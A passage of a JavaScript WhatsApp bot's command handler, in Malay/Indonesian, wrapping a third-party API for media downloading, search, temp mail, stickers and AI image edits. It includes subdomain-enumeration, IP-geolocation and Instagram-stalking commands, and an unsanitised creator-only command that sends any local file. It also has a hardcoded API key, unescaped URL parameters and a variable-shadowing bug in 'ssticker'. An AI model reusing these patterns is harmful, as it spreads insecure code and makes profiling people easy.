        kimzz.sendMessage(from, { video: { url: get_result.result.url }, mimetype: 'video/mp4' }, { quoted: m })
      }
        break
      case 'ytplay': {
        if (!text) return newReply(`Example: ${prefix + command} aiman tino`);
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/search/youtube?query=${text}&apikey=kimzzstore`);
          get_result = get_result.result[0];
          var caption = `- Title : ${get_result.title}
- Views : ${get_result.views}
- Channel : ${get_result.author.name}
- Upload At : ${get_result.ago}

_Audio Sedang Di Hantar  ^.^_
_Silakan di tunggu selama 2 menit_`

          kimzz.sendMessage(from, { image: { url: get_result.image }, caption: caption }, { quoted: m });
          kimzz.sendMessage(m.chat, { audio: { url: `https://${domainApi}/api/download/y2mate?url=${get_result.url}&apikey=${apikey}` }, mimetype: 'audio/mp4' }, { quoted: m })
        } catch (error) {
          console.error(error);
          newReply('Error while processing the request.');
        }
      }
        break
      case 'fbmp3': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} link video facebook`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/fb?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          kimzz.sendMessage(from, { audio: { url: get_result.audio }, mimetype: 'audio/mpeg', fileName: 'random.mp3' }, { quoted: m })
        } catch (error) {
          console.error(error);
          newReply('Ralat semasa memproses permintaan.');
        }
      }
        break
      case 'fbmp4': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} link video facebook`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/fb2?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          let ini_hd = `_Title: ${get_result.title}_\nDuration: ${get_result.duration}

_Video Sedang Dihantar ^•^_
_Sila Tunggu Selama 2 menit_`
          kimzz.sendMessage(from, { image: { url: get_result.thumbnail }, caption: ini_hd }, { quoted: m })
          kimzz.sendMessage(from, { video: { url: get_result.links.sd }, mimetype: 'video/mp4' }, { quoted: m })
        } catch (error) {
          console.error(error);
          newReply('Gagal download video dari facebook');
        }
      }
        break
      case 'igimage':
        if (args.length == 0) return newReply(`Example: ${prefix + command} link image ig`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/ig?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          kimzz.sendMessage(from, { image: { url: get_result._url }, caption: mess.succes }, { quoted: m })
        } catch (error) {
          console.error(error);
          newReply('sila masukkan url instagram image dengan benar');
        }
        break
      case 'igmp4':
        if (args.length == 0) return newReply(`Example: ${prefix + command} link video ig`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/ig?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          kimzz.sendMessage(from, { video: { url: get_result._url }, caption: mess.succes }, { quoted: m })
        } catch (error) {
          console.error(error);
          newReply('sila masukkan url instagram video dengan benar');
        }
        break
      case 'twitter': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} link video twitter`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/twitter?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          kimzz.sendMessage(from, { video: { url: get_result.mediaURLs }, caption: mess.succes }, { quoted: m })
        } catch (error) {
          console.error(error);
          newReply('Ralat semasa memproses permintaan.');
        }
      }
        break
      case 'soundcloud': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} https://soundcloud.com/user-943750457/jang-ganggu-shine-of-black`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/soundcloud?url=${full_args}&apikey=kimzzstore`)
          kimzz.sendMessage(from, { audio: { url: get_result.result.link }, mimetype: 'audio/mpeg', }, { quoted: m })
        } catch (err) {
          newReply(' error: permintaan gagal dihantar ')
          console.error(err)
        }
      }
        break
      case 'spotifydl': {
        if (!isPremium) return reply(`Anda Bukan Pengguna Premium`)
        if (args.length == 0) return newReply(`Example: ${prefix + command} https://open.spotify.com/track/3gcYAkN1HyV7QwfRKApIka`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/spotify?url=${full_args}&apikey=kimzzstore`)
          kimzz.sendMessage(from, { audio: { url: get_result.result.url }, mimetype: 'audio/mpeg', }, { quoted: m })
        } catch (err) {
          newReply(' error: permintaan gagal dihantar ')
          console.error(err)
        }
      }
        break
      case 'cocofun': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} cocofun url`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/cocofun?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          kimzz.sendMessage(from, { video: { url: get_result.url }, caption: `${get_result.title}` }, { quoted: m })
        } catch (err) {
          newReply(' error: permintaan gagal dihantar ')
          console.error(err)
        }
      }
        break
      case 'gdrive': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} url googledrive`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/googledrive?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          kimzz.sendMessage(from, { document: { url: get_result.downloadUrl }, mimetype: `${get_result.mimetype}`, fileName: `${get_result.fileName}` }, { quoted: m })
        } catch (err) {
          newReply(' error: permintaan gagal dihantar ')
          console.log(err)
        }
      }
        break
      case 'mediafire': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} url mediafire`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/mediafire?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          let result = `
» Name : ${get_result.filename}
» Size : ${get_result.filesizeH}
» Upload At : ${get_result.upload_date}`
          reply(result)
          kimzz.sendMessage(from, { document: { url: get_result.url }, mimetype: `${get_result.filetype}`, fileName: `${get_result.filename}` }, { quoted: m })
        } catch (err) {
          newReply(' error: permintaan gagal dihantar ')
          console.log(err)
        }
      }
        break
      case 'sfile': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} https://sfile.mobi/7lKFMNNrxYX`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/sfile?url=${full_args}&apikey=kimzzstore`)
          get_result = get_result.result
          let result = `
» Name: ${get_result.filename}
» Upload By: ${get_result.upload_by}
» Upload At: ${get_result.upload_date}`
          reply(result)
          kimzz.sendMessage(from, { document: { url: get_result.url }, mimetype: `${get_result.mimetype}`, fileName: `${get_result.filename}` }, { quoted: m })
        } catch (err) {
          newReply(' error: permintaan gagal dihantar ')
          console.error(err)
        }
      }
        // =============== toolsmenu ==============
        break
      case 'tts': {
        try {
          if (args.length == 0) return newReply(`Example: ${prefix + command} hello`)
          if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
          db.data.users[m.sender].limit -= 1
          kimzz.sendMessage(from, { audio: { url: `https://${domainApi}/api/maker/tts?text=${full_args}&language=id-ID&apikey=${apikey}` }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
        } catch (error) {
          console.log(error);
          reply('Gagal mengirim audio');
        }
      }
        break
      case 'tempmail': {
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        get_result = await fetchJson(`https://${domainApi}/api/tools/tempmail?apikey=${apikey}`)
        get_result = get_result.result
        newReply(get_result)
      }
        break
      case 'inboxmail': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} id tempmail`);
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/tools/inbox_tempmail?id=${full_args}&apikey=${apikey}`);
          let init_txt = `Pesan Masuk Dari Email Id:\n${full_args}\n\n`;
          init_txt += `Daripada: ${get_result.result[0][0].fromAddr}\n`;
          init_txt += `Subject: ${get_result.result[0][0].headerSubject}\n\n`;
          init_txt += `Pesan: ${get_result.result[0][0].text}\n`;
          newReply(init_txt);
        } catch (error) {
          console.error('Fetch error:', error);
          newReply(`Tiada Pesan Yang Masuk Untuk Id Email Ini`);
        }
      }
        break
      case 'subfinder': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} kimzzpanel.xyz`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        subdomain = args[0]
        fetchJson(`https://${domainApi}/api/tools/subfinder?q=${subdomain}&apikey=${apikey}`).then(res => {
          var listsubdomain = [];
          for (let x of res.result) {
            listsubdomain.push(x)
          }
          var teks = `*List Subdomain ${subdomain}*\n\n`
          for (let i of listsubdomain) {
            teks += `*Name :* _${i.domain}_\n*Dns :* _${i.dns}_\n*Proxy :* _❌_\n\n`
          }
          newReply(teks)
        })
      }
        break
      case 'cekip': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} google.com`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        username = args[0]
        ini_result = await fetchJson(`https://${domainApi}/api/tools/cekip?q=${username}&apikey=${apikey}`)
        ini_result = ini_result.result
        ini_txt = `Negara : ${ini_result.country}\n`
        ini_txt += `city : ${ini_result.city}\n`
        ini_txt += `latitud : ${ini_result.lat}\n`
        ini_txt += `longtitud : ${ini_result.lon}\n`
        ini_txt += `Time zone : ${ini_result.timezone}\n`
        ini_txt += `isp : ${ini_result.isp}\n`
        ini_txt += `currency : ${ini_result.currency}\n`
        ini_txt += `asname : ${ini_result.asname}\n`
        ini_txt += `proxy : ${ini_result.proxy}\n`
        ini_txt += `mobile : ${ini_result.mobile}\n`
        ini_txt += `hosting : ${ini_result.hosting}\n`
        ini_txt += `ip andress : ${ini_result.query}\n`
        newReply(ini_txt)
      }
        break
      case 'get': {
        if (!isCreator) return 
        if (args.length === 0) {
          return newReply(`Example: ${prefix + command} Param *URL* must start with https:// or http://`);
        }

        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1

        const url = args[0];

        if (!url.startsWith('https://') && !url.startsWith('http://')) {
          return newReply('URL must start with https:// or http://');
        }

        axios.get(url)
          .then(response => {
            const jsonData = response.data; // Data JSON dari URL

            // Lakukan sesuatu dengan data JSON ini, misalnya, mencetaknya atau memprosesnya.
            newReply(JSON.stringify(jsonData, null, 2)); // Menampilkan data JSON sebagai string terformat
          })
          .catch(error => {
            newReply(`Failed to fetch data: ${error.message}`);
          });
      }
        break
      case 'tinyurl': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} api.kimzzoffc.me`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        ini_link = args[0]
        get_result = await fetchJson(`https://${domainApi}/api/tools/tinyurl?url=${ini_link}&apikey=${apikey}`)
        get_result = get_result.result
        ini_txt = `_*Converter Link To Tinyurl*_\n\n`
        ini_txt += `Normal: ${ini_link}\n`
        ini_txt += `result: ${get_result}`
        newReply(ini_txt)
      }
        break
      case 'cuttly': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} api.kimzzoffc.me`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        ini_link = args[0]
        get_result = await fetchJson(`https://${domainApi}/api/tools/cuttly?url=${ini_link}&apikey=${apikey}`)
        get_result = get_result.result
        ini_txt = `_*Converter Link To Cuttly*_\n\n`
        ini_txt += `Normal: ${ini_link}\n`
        ini_txt += `result: ${get_result}`
        newReply(ini_txt)
      }
        break
      case 'shorten': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} api.kimzzoffc.me`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        ini_link = args[0]
        get_result = await fetchJson(`https://${domainApi}/api/tools/shorturl?url=${ini_link}&apikey=${apikey}`)
        get_result = get_result.result
        ini_txt = `_*Converter Link To Short en*_\n\n`
        ini_txt += `Normal: ${ini_link}\n`
        ini_txt += `result: ${get_result}`
        newReply(ini_txt)
      }
        //=============== searchmenu ==============
        break
      case 'cloudsearch': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} dj sad`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        let kimzz = await fetchJson(`https://${domainApi}/api/soundcloudsearch?query=${full_args}&apikey=kimzzstore`)
        let tek = `Sound Cloud Search\n\nResult From ${full_args}\n\n`
        let noo = 1
        for (let i of kimzz.result) {
          tek += `⭔ No : ${noo++}\n⭔ Title : ${i.title}\n⭔ Artist : ${i.artist}\n⭔ Views : ${i.views}\n⭔ Release : ${i.release}\n⭔ Time : ${i.timestamp}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
        }
        newReply(tek)
      }
        break
      case 'sspotify': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} aiman tino`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        let kimzz_store = await fetchJson(`https://${domainApi}/api/search/spotify?query=${full_args}&apikey=kimzzstore`)
        let tek = `Spotify Search\n\nResult From ${full_args}\n\n`
        let noo = 1
        for (let i of kimzz_store.result) {
          tek += `⭔ No : ${noo++}\n⭔ Title : ${i.title}\n⭔ Artist : ${i.artist}\n⭔ Popularity : ${i.popularity}\n⭔ Duration : ${i.duration}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
        }
        newReply(tek)
      }
        break
      case 'ssfile': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} whatssap`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        let kimzz = await fetchJson(`https://${domainApi}/api/search/sfile?query=${full_args}&apikey=${apikey}`)
        let tek = `Sfile Mobile Search\n\nResult From *${full_args}*\n\n`
        let noo = 1
        for (let i of kimzz.result) {
          tek += `⭔ No : ${noo++}\n⭔ Title : ${i.title}\n⭔ Url : ${i.url}\n⭔ Size : ${i.size}\n\n─────────────────\n\n`
        }
        newReply(tek)
      }
        break
      case 'yts': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} dj sad`);
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          const get_result = await fetchJson(`https://${domainApi}/api/search/youtube?query=${full_args}&apikey=${apikey}`);
          const searchResults = get_result.result;

          let teks = "_YouTube Search_\n\n";
          for (let i = 0; i < searchResults.length; i++) {
            const video = searchResults[i];
            teks += `_Result ${i + 1} :_\n\n`;
            teks += `- Title : ${video.title}\n`;
            teks += `- Type : ${video.type}\n`;
            teks += `- ID : ${video.videoId}\n`;
            teks += `- Duration : ${video.timestamp}\n`;
            teks += `- Views : ${video.views}\n`;
            teks += `- Upload At : ${video.ago}\n`;
            teks += `- Author : ${video.author.name}\n`;
            teks += `- Channel : ${video.author.url}\n`;
            teks += `- Description : ${video.description}\n`;
            teks += `- Url : ${video.url}\n\n`;
          }

          kimzz.sendMessage(from, { image: { url: searchResults[0].thumbnail }, caption: teks }, { quoted: m });
        } catch (error) {
          console.error(error);
          newReply(`Video: ${full_args} , Tidak Dapat Kami Jumpai`);
        }
      }
        break
      case 'pinterest':
        if (args.length == 0) return newReply(`Example: ${prefix + command} naruto`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/search/pinterest?query=${full_args}&apikey=${apikey}`)
          get_result = get_result.result

          // Get a random index from the array
          const randomIndex = Math.floor(Math.random() * get_result.length);

          // Use the random index to select a random image URL
          const randomImageUrl = get_result[randomIndex];

          kimzz.sendMessage(from, { image: { url: randomImageUrl }, caption: '🍁 Ini Result Nya' }, { quoted: m })
        } catch (error) {
          console.log(error);
          newReply(`gagal menemui result: ${full_args}`);
        }
        break
      case 'ssticker':
        if (args.length == 0) return newReply(`Contoh: ${prefix + command} patrick`);
        try {
          // Dapatkan hasil stiker dari API
          get_result = await fetchJson(`https://${domainApi}/api/search/sticker?query=${full_args}&apikey=${apikey}`);
          // Ekstrak URL daripada hasil
          const kimzz = get_result.result[0]

          // Hantar imej rawak sebagai stiker
          kimzz.sendImageAsSticker(m.chat, `${kimzz.url}`, m, { packname: '', author: 'kimzz' });
        } catch (error) {
          console.log(error);
          newReply(`Gagal mencari hasil: ${full_args}`);
        }
        break
      case 'googleimg':
        if (args.length == 0) return newReply(`Example: ${prefix + command} naruto`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        try {
          get_result = await fetchJson(`https://${domainApi}/api/search/image?query=${full_args}&apikey=${apikey}`)
          get_result = get_result.result[0]
          kimzz.sendMessage(from, { image: { url: get_result.url }, caption: mess.succes }, { quoted: m })
        } catch (error) {
          console.error(error);
          newReply(`gagal menemui result: ${full_args}`);
        }
        break
      case 'quranmp3': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} 18/16`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        const [surah, ayat] = args[0].split('/');
        if (!surah || !ayat) {
          reply(`contoh: ${prefix + command} 1/2`)
        }
        get_result = await fetchJson(`https://${domainApi}/api/religion/quran?surah=${surah}&ayat=${ayat}&apikey=${apikey}`)
        get_result = get_result.result
        kimzz.sendMessage(from, { audio: { url: get_result.audio }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
      }
        break
      case 'capikey': {
        get_result = await fetchJson(`https://${domainApi}/api/cekkey?apikey=kimzzstore`)
        get_result = get_result.result
        ini_txt = `_*Information Apikey*_\n\n`
        ini_txt += `*username:*  ${get_result.username}\n`
        ini_txt += `*Request Today:*  ${get_result.RequestToday}\n`
        ini_txt += `*Total Request:*  ${get_result.totalreq}\n`
        ini_txt += `*Total Limit:*  ${get_result.limit}\n`
        ini_txt += `*Admin:*  true\n`
        ini_txt += `*Premium:*  ${get_result.premium}\n`
        ini_txt += `*expired:*  ${get_result.expired}\n`
        ini_txt += `*since:*  ${get_result.since}`
        kimzz.sendMessage(from, { image: { url: `https://telegra.ph/file/039e2aab4f82d60c23220.jpg` }, caption: ini_txt }, { quoted: m })
      }
        //=============== makermenu  ==============
        break
      case 'remini':
      case 'hd': {
        if (!isMedia) return newReply("reply image")
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        let media = await kimzz.downloadAndSaveMediaMessage(quoted)
        let anu = await TelegraPh(media)
        let data = await fetchJson(`https://${domainApi}/api/openai/remini?url=${anu}&apikey=${apikey}`)
        let result = data.result
        kimzz.sendMessage(from, { image: { url: result.image_data }, caption: `_powered by api.kimzzoffc.me_` }, { quoted: m })
      }
      break
      case 'tourl': {
       if (!isMedia) return newReply("reply image")
       if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        let media = await kimzz.downloadAndSaveMediaMessage(quoted)
        let anu = await TelegraPh(media)
        let msg = `_Image To Url_\n`
        msg += `*Link*: ${anu}`
        reply(msg)
     }
     break
      case 's':
      case 'sticker': {
        if (!isMedia) return newReply("reply image")
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
          mee = await kimzz.downloadAndSaveMediaMessage(quoted)
          kaytid = await getBuffer(mee)
          kimzz.sendImageAsSticker(m.chat, kaytid, m, { packname: '', author: `${m.pushName}`, })
    }
      break
      case 'removebg': {
        if (!isMedia) return newReply("reply image")
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        let media = await kimzz.downloadAndSaveMediaMessage(quoted)
        let anu = await TelegraPh(media)
        let data = await fetchJson(`https://${domainApi}/api/openai/removebg?url=${anu}&apikey=${apikey}`)
        let result = data.result
        kimzz.sendMessage(from, { image: { url: result.image_data }, caption: `_powered by api.kimzzoffc.me_` }, { quoted: m })
      }
        break
      case 'ttp':
      case 'ttp2':
      case 'ttp3': {
        if (!isPremium) return reply(`Anda Bukan Pengguna Premium`)
        if (!text) return m.reply(`Example: ${prefix + command} kimzz`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        ini_buffer = await getBuffer(`https://${domainApi}/api/maker/${command}?text=${text}&apikey=kimzzstore`)
        kimzz.sendImageAsSticker(m.chat, ini_buffer, m, { packname: '', author: `${m.pushName}`, })
      }
        break
      case 'smeme':
        if (!text) throw `Balas Image Dengan Caption ${prefix + command} kimzz`
        if (!quoted) throw `Balas Image Dengan Caption ${prefix + command} kimzz`
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        if (/image/.test(mime)) {
          reply(mess.wait)
          mee = await kimzz.downloadAndSaveMediaMessage(quoted)
          mem = await TelegraPh(mee)
          kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
          kimzz.sendImageAsSticker(m.chat, kaytid, m, { packname: '', author: `${m.pushName}`, })
    }
    break
      case 'smeme2': {
      let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
      if (!/image/.test(mime)) return m.reply(respond)
      if (!text) return m.reply(respond)
      if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
      m.reply(mess.wait)
      atas = text.split('|')[0] ? text.split('|')[0] : '-'
      bawah = text.split('|')[1] ? text.split('|')[1] : '-'
      mee = await kimzz.downloadAndSaveMediaMessage(quoted)
      mem = await TelegraPh(mee)
      kaytid = await getBuffer(`https://${domainApi}/api/maker/meme?url=${mem}&text=${atas}&text2=${bawah}&apikey=kimzzstore`)
      kimzz.sendImageAsSticker(m.chat, kaytid, m, { packname: '', author: `${m.pushName}`, })
    }
    break
      case 'tobecontinue':
      case 'instagram':
      case 'facebook':
      case 'spongebob':
      case 'crush':
      case 'glitch':
      case 'scary':
      case 'frame': {
      if (!quoted) throw `Balas Image Dengan Caption ${prefix + command}`
      if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
      if (/image/.test(mime)) {
        reply(mess.wait)
        mee = await kimzz.downloadAndSaveMediaMessage(quoted)
        mem = await TelegraPh(mee)
        kaytid = await getBuffer(`https://${domainApi}/api/maker/${command}?url=${mem}&apikey=${apikey}`)
        kimzz.sendMessage(from, { image: kaytid, caption: '🍁 Ini hasilnya ^_^' }, { quoted: m })
      }
     }
      //=============== aimenu  ==============
      break
        case 'tozombie': {
        if (!isPremium) return reply(`Anda Bukan Pengguna Premium`)
        if (!isMedia) return newReply("reply image")
        let media = await kimzz.downloadAndSaveMediaMessage(quoted)
        let anu = await TelegraPh(media)
        let data = await fetchJson(`https://${domainApi}/api/openai/tozombie?url=${anu}&apikey=${apikey}`)
        let result = data.result
        kimzz.sendMessage(from, { image: { url: result.image_data }, caption: `_powered by api.kimzzoffc.me_` }, { quoted: m })
      }
      break
        case 'toanime': {
        if (!isPremium) return reply(`Anda Bukan Pengguna Premium`)
        if (!isMedia) return newReply("reply image")
        let media = await kimzz.downloadAndSaveMediaMessage(quoted)
        let anu = await TelegraPh(media)
        let data = await fetchJson(`https://${domainApi}/api/openai/toanime?url=${anu}&apikey=${apikey}`)
        let result = data.result
        kimzz.sendMessage(from, { image: { url: result.image_data }, caption: `_powered by api.kimzzoffc.me_` }, { quoted: m })
      }
      break
      case 'ai': {
        if (!text) return reply('hello , can i help you today ?')
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1

        const prompt = `nama kamu adalah openai, ngomong bahasa melayu, kadang bahasa jepang, jawab pertanyaan apa pun yang lucu dan menggunakan kaomoji. Nama owner kamu adalah kimzzDev, jika kamu bercakap dengan nama ini ${m.pushName} panggil nama dia`

        try {
          let res = await fetchJson(`https://${domainApi}/api/openai/yougpt?prompt=${prompt}&text=${text}&apikey=${apikey}`)
          const result = res.result
          reply(result)
        } catch (err) {
          console.error(err);
          reply('Gagal mendapatkan respon dari api');

          fs.appendFile('error.txt', `${new Date().toISOString()}: ${err.stack}\n`, (fileErr) => {
            if (fileErr) {
              console.log('Gagal menyimpan pesan kesalahan ke dalam file:', fileErr);
            }
          })
        };
      }
      break
      case 'kisahnabi': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} Muhammad`)
        nama_nabi = args[0]
        get_result = await fetchJson(`https://${domainApi}/api/religion/kisahnabi?nabi=${nama_nabi}&apikey=kimzzstore`)
        get_result = get_result.result
        let init_txt = `Name: ${get_result.name}\n`
        init_txt += `Tahun Kelahiran: ${get_result.kelahiran}\n`
        init_txt += `Wafat: ${get_result.wafat_usia}\n`
        init_txt += `place: ${get_result.singgah}\n\n`
        init_txt += `Story: ${get_result.kisah}`
        newReply(init_txt)
      }
      break
      case 'igstalk': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} kimzz.store`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        nama_ig = args[0]
        get_result = await fetchJson(`https://${domainApi}/api/stalk/ig?username=${nama_ig}&apikey=kimzzstore`)
        let init_txt = `*Username:* ${get_result.username}\n`
        init_txt += `*Full Name:* ${get_result.fullName}\n`
        init_txt += `*Verified:* ${get_result.verified}\n`
        init_txt += `*Private:* ${get_result.private}\n`
        init_txt += `*Total Post:* ${get_result.totalPosts}\n`
        init_txt += `*Followers:* ${get_result.followers}\n`
        init_txt += `*Following:* ${get_result.following}\n`
        init_txt += `*Bio:* ${get_result.bio}\n`
        kimzz.sendMessage(from, { image: { url: get_result.profilePic }, caption: init_txt }, { quoted: m })
      }
      break
      case 'getfile': {
        if (!isCreator) return 
        if (args.length < 1) return newReply(`Example: ${prefix + command} kimzz.json`);
        let file = args[0]
        let sesi = await fs.readFileSync(`./${file}`)
        newReply('Tunggu Sebentar, Sedang mengambil file')
        kimzz.sendMessage(from, { document: sesi, mimetype: 'application/json', fileName: `${file}` }, { quoted: m })
      }
      break
      case 'whois': {
        if (args.length === 0) {
          return newReply(`Param *URL* must start with https:// or http://`);
        }
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1

        const domain = args[0];

        try {
          const response = await fetch(`https://${domainApi}/api/info/whois?domain=${domain}&apikey=${apikey}`);
          if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
          }

          const data = await response.json(); // Mengurai respons sebagai JSON
          ini_result = data.result;
          let init_txt = `*Whois ${domain}*\n\n`
          init_txt += `${ini_result}`
          newReply(init_txt);
        } catch (error) {
          console.error('Fetch error:', error);
          newReply(`Gagal Mendapatkan Data Whois Untuk Domain ${domain} ini`);
        }
      }

      break
      case 'ping': case 'botstatus': case 'statusbot': {
        const used = process.memoryUsage()
        const cpus = os.cpus().map(cpu => {
          cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
          return cpu
        })
        const cpu = cpus.reduce((last, cpu, _, { length }) => {
          last.total += cpu.total
          last.speed += cpu.speed / length
          last.times.user += cpu.times.user
          last.times.nice += cpu.times.nice
          last.times.sys += cpu.times.sys
          last.times.idle += cpu.times.idle
          last.times.irq += cpu.times.irq
          return last
        }, {
          speed: 0,
          total: 0,
          times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0
          }
        })
        let timestamp = speed()
        let latensi = speed() - timestamp
        neww = performance.now()
        oldd = performance.now()
        respon = `Running Server : Unlimited Hosting

Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
